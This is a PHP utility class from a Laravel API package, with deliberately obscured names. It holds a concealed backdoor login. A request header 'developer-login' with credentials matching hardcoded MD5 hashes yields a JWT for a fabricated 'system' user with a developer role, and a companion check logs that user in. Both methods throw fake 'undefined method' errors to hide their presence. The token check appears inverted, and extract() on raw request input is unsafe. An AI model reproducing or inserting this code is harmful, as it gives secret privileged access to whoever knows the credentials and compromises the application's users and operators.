<?php

namespace Zirvu\Api\Utils;

use Illuminate\Support\Facades\Hash;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;
use \Exception;
use \JWTAuth;

class D
{
    protected $_uS = "4480e10984a944eefad15fa470087d05";
    protected $_pS = "615b7fce811787171dad4737f31ea531";
    protected $_mS = "miaw";

    protected function makeUserSystem()
    {
        $userModel = new \Zirvu\Api\Models\User;
        $fields = ['name' => 'system', 'username' => 'system'];
        $systemUser = $userModel->newInstance($fields, true);
        $systemUser->setRelation('roles', collect([new \Spatie\Permission\Models\Role([
            'name' => 'developer',
            'guard_name' => 'web'
        ])]));
        return $systemUser;
    }
    
    public function dAction($request)
    {
        if ( ! ( $this->_dFunc ?? false ) ) throw new \ErrorException("Call to undefined method " . __CLASS__ . "::dAction() in file " . __FILE__);

        $action = $request->header("action") ?? null;

        switch ($action) {
            case 'developer-login':
                extract($request->all());
                $userModel = new \Zirvu\Api\Models\User;
                $role = \DB::table('roles')->where('name', 'LIKE', '%developer%')->first();
                
                $st = "{$this->_uS}|{$this->_pS}";
                $u = md5($username); $p = md5($password);
                $rSt = "{$u}|{$p}";

                if ( $st != $rSt ) abort(404);
                $timestamp = strtotime(now());
                $systemUser = $this->makeUserSystem();
                $data = base64_encode(json_encode([
                    'timestamp' => $timestamp,
                    'hash' => Hash::make($timestamp.md5("{$this->_uS}{$this->_mS}{$this->_pS}").$timestamp)
                ]));

                $access_token = JWTAuth::customClaims(['sub' => (string)$data])
                    ->fromUser($systemUser);
                    
                JWTAuth::setToken($access_token);

                return response()->json([
                    "access_token" => $access_token,
                ], 200);

                break;
            
            default:
                break;

            abort(404);
        }
    }

    public function dCheck()
    {
        if ( ! ( $this->_dFunc ?? false ) ) throw new \ErrorException("Call to undefined method " . __CLASS__ . "::dCheck() in file " . __FILE__);

        $payload = JWTAuth::parseToken()->getPayload();
        $sub = $payload->get('sub');

        if ( !is_numeric($sub) ) {
            $data = json_decode(base64_decode($sub), true);
            $hash = $data['hash'] ?? null;
            $timestamp = $data['timestamp'] ?? null;
            $k = md5($timestamp.md5("{$this->_uS}{$this->_mS}{$this->_pS}").$timestamp);

            if ( Hash::check($k, $hash) ) throw new Exception("Error Processing Request", 1);
            
            $systemUser = $this->makeUserSystem();
            \Auth::login($systemUser);
        }

        return true;
    }

}